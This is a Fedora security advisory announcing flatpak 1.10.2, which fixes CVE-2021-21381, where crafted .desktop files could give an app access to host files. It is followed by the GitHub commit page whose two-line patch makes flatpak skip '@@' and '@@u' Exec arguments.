* [December](/archives/list/package-announce%40lists.fedoraproject.org/2010/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2010/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2010/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2010/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2010/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2010/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2010/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2010/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2010/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2010/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2010/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2010/1/)

### 2009

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2009/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2009/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2009/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2009/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2009/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2009/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2009/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2009/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2009/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2009/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2009/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2009/1/)

### 2008

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2008/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2008/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2008/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2008/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2008/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2008/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2008/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2008/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2008/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2008/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2008/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2008/1/)

### 2007

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2007/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2007/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2007/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2007/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2007/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2007/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2007/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2007/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2007/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2007/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2007/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2007/1/)

### 2006

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2006/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2006/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2006/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2006/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2006/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2006/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2006/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2006/5/)

[List overview](/archives/list/package-announce%40lists.fedoraproject.org/)

[Download](/archives/list/package-announce%40lists.fedoraproject.org/export/package-announce%40lists.fedoraproject.org-WXNVFOIB6ZP4DGOVKAM25T6OIEP3YLGV.mbox.gz?message=WXNVFOIB6ZP4DGOVKAM25T6OIEP3YLGV "This message in gzipped mbox format")

[thread](/archives/list/package-announce%40lists.fedoraproject.org/thread/WXNVFOIB6ZP4DGOVKAM25T6OIEP3YLGV/#WXNVFOIB6ZP4DGOVKAM25T6OIEP3YLGV)

# [SECURITY] Fedora 33 Update: flatpak-1.10.2-1.fc33

![](https://seccdn.libravatar.org/avatar/be256568dfce45c1862b55e6cf3f2726.jpg?s=120&d=retro&r=g)

[updates＠fedoraproject.org](/archives/users/3d8bb2e4c1d843beb492d4f8a7c44761/ "See the profile for updates＠fedoraproject.org")

19 Mar
2021

19 Mar
'21

11:50 a.m.

--------------------------------------------------------------------------------
Fedora Update Notification
FEDORA-2021-26ad138ffa
2021-03-19 18:48:17.335551
--------------------------------------------------------------------------------

Name : flatpak
Product : Fedora 33
Version : 1.10.2
Release : 1.fc33
URL : <http://flatpak.org/>
Summary : Application deployment framework for desktop apps
Description :
flatpak is a system for building, distributing and running sandboxed desktop
applications on Linux. See <https://wiki.gnome.org/Projects/SandboxedApps> for
more information.

--------------------------------------------------------------------------------
Update Information:

flatpak 1.10.2 release. This is a security update which fixes a potential
attack where a flatpak application could use custom formated .desktop files to
gain access to files on the host system. Other changes: \* Fix memory leaks \*
Some test fixes \* Documentation updates \* G\_BEGIN/END\_DECLS added to library
headders for c++ use \* Fix for X11 cookies on OpenSUSE \* Spawn portal better
handles non-utf8 filenames
--------------------------------------------------------------------------------
ChangeLog:

\* Wed Mar 10 2021 Kalev Lember klember@redhat.com - 1.10.2-1
- Update to 1.10.2
--------------------------------------------------------------------------------
References:

[ 1 ] Bug #1936985 - CVE-2021-21381 flatpak: the "file forwarding" feature can be used to gain unprivileged access to files
<https://bugzilla.redhat.com/show_bug.cgi?id=1936985>
--------------------------------------------------------------------------------

This update can be installed with the "dnf" update program. Use
su -c 'dnf upgrade --advisory FEDORA-2021-26ad138ffa' at the command
line. For more information, refer to the dnf documentation available at
<http://dnf.readthedocs.io/en/latest/command_ref.html#upgrade-command-label>

All packages are signed with the Fedora Project GPG key. More details on the
GPG keys used by the Fedora Project can be found at
<https://fedoraproject.org/keys>
--------------------------------------------------------------------------------

[0](#like "You must be logged-in to vote.")
[0](#dislike "You must be logged-in to vote.")

Reply

[Back to the thread](/archives/list/package-announce%40lists.fedoraproject.org/thread/WXNVFOIB6ZP4DGOVKAM25T6OIEP3YLGV/#WXNVFOIB6ZP4DGOVKAM25T6OIEP3YLGV)

[Back to the list](/archives/list/package-announce%40lists.fedoraproject.org/)

Powered by [HyperKitty](http://hyperkitty.readthedocs.org) version 1.3.7.



=== Content from github.com_3053937e_20250114_175903.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fflatpak%2Fflatpak%2Fcommit%2F8279c5818425b6812523e3805bbe242fb6a5d961)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fflatpak%2Fflatpak%2Fcommit%2F8279c5818425b6812523e3805bbe242fb6a5d961)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=flatpak%2Fflatpak)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[flatpak](/flatpak)
/
**[flatpak](/flatpak/flatpak)**
Public

* [Notifications](/login?return_to=%2Fflatpak%2Fflatpak) You must be signed in to change notification settings
* [Fork
  408](/login?return_to=%2Fflatpak%2Fflatpak)
* [Star
   4.3k](/login?return_to=%2Fflatpak%2Fflatpak)

* [Code](/flatpak/flatpak)
* [Issues
  972](/flatpak/flatpak/issues)
* [Pull requests
  76](/flatpak/flatpak/pulls)
* [Actions](/flatpak/flatpak/actions)
* [Projects
  0](/flatpak/flatpak/projects)
* [Wiki](/flatpak/flatpak/wiki)
* [Security](/flatpak/flatpak/security)
* [Insights](/flatpak/flatpak/pulse)

Additional navigation options

* [Code](/flatpak/flatpak)
* [Issues](/flatpak/flatpak/issues)
* [Pull requests](/flatpak/flatpak/pulls)
* [Actions](/flatpak/flatpak/actions)
* [Projects](/flatpak/flatpak/projects)
* [Wiki](/flatpak/flatpak/wiki)
* [Security](/flatpak/flatpak/security)
* [Insights](/flatpak/flatpak/pulse)

## Commit

[Permalink](/flatpak/flatpak/commit/8279c5818425b6812523e3805bbe242fb6a5d961)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

Disallow @@ and @[@U](https://github.com/U) usage in desktop files

[Browse files](/flatpak/flatpak/tree/8279c5818425b6812523e3805bbe242fb6a5d961)
Browse the repository at this point in the history

```
Fixes [#4146](https://github.com/flatpak/flatpak/issues/4146).

(cherry picked from commit [652a28f](https://github.com/flatpak/flatpak/commit/652a28ffab67cb6cd7d12dc3a93979bcd3731c7f))
```

* Loading branch information

[![@refi64](https://avatars.githubusercontent.com/u/1690697?s=40&v=4)](/refi64) [![@alexlarsson](https://avatars.githubusercontent.com/u/990736?s=40&v=4)](/alexlarsson)

[refi64](/flatpak/flatpak/commits?author=refi64 "View all commits by refi64")
authored and
[alexlarsson](/flatpak/flatpak/commits?author=alexlarsson "View all commits by alexlarsson")
committed
Mar 10, 2021

1 parent
[c638bf9](/flatpak/flatpak/commit/c638bf92082f852422ee0c7aa4c99e95c5f16435)

commit 8279c58

Showing
**1 changed file**
with
**2 additions**
and
**0 deletions**.

* Whitespace
* Ignore whitespace

* Split
* Unified

## There are no files selected for viewing

2 changes: 2 additions & 0 deletions

2
[common/flatpak-dir.c](#diff-d9bbbd38e2a88a01804605a2d35dc54e31a761255be1fd7631f411778d1060a3 "common/flatpak-dir.c")

Show comments

[View file](/flatpak/flatpak/blob/8279c5818425b6812523e3805bbe242fb6a5d961/common/flatpak-dir.c)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -7139,6 +7139,8 @@ export\_desktop\_file (const char \*app, |
|  |  | g\_string\_append\_printf (new\_exec, " @@ %s @@", arg); |
|  |  | else if (strcasecmp (arg, "%u") == 0) |
|  |  | g\_string\_append\_printf (new\_exec, " @@u %s @@", arg); |
|  |  | else if (strcmp (arg, "@@") == 0 || strcmp (arg, "@@u") == 0) |
|  |  | g\_print (\_("Skipping invalid Exec argument %s\n"), arg); |
|  |  | else |
|  |  | g\_string\_append\_printf (new\_exec, " %s", arg); |
|  |  | } |
| Expand Down | |  |

Toggle all file notes
Toggle all file annotations

### 0 comments on commit `8279c58`

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fflatpak%2Fflatpak%2Fcommit%2F8279c5818425b6812523e3805bbe242fb6a5d961) to comment.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


